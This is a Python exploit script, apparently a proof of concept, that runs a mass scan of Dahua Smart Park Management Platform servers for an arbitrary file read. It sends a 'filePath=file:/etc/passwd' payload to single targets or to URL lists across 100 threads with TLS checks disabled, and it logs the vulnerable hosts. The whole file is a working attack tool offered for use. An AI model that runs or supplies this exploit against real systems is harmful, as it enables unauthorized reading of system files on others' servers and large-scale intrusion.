import argparse,requests,sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
    ██████╗ ██╗  ██╗███████╗██╗  ██╗██╗   ██╗
    ██╔══██╗██║  ██║╚══███╔╝██║  ██║╚██╗ ██╔╝
    ██║  ██║███████║  ███╔╝ ███████║ ╚████╔╝ 
    ██║  ██║██╔══██║ ███╔╝  ██╔══██║  ╚██╔╝  
    ██████╔╝██║  ██║███████╗██║  ██║   ██║   
    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   
    """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="大华智慧园区管理平台任意密码读取")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter URL")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file with URLs")

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")

def poc(target):
    payload = "/portal/itc/attachment_downloadByUrlAtt.action?filePath=file:/etc/passwd"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.1",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Content-Length": "2",
    }
    try:
        res1 = requests.get(url=target, verify=False, timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target + payload, verify=False, headers=headers, timeout=5)
            if "root" in res2.text:
                with open("result.txt", "a", encoding='utf-8') as f:
                    f.write(f"[+]{target}存在任意文件读取漏洞\n")
                return True
            else:
                print(f"[-]{target}不存在任意文件读取漏洞")
    except requests.RequestException as e:
        print(f"请求错误: {e}")

if __name__ == '__main__':
    main()
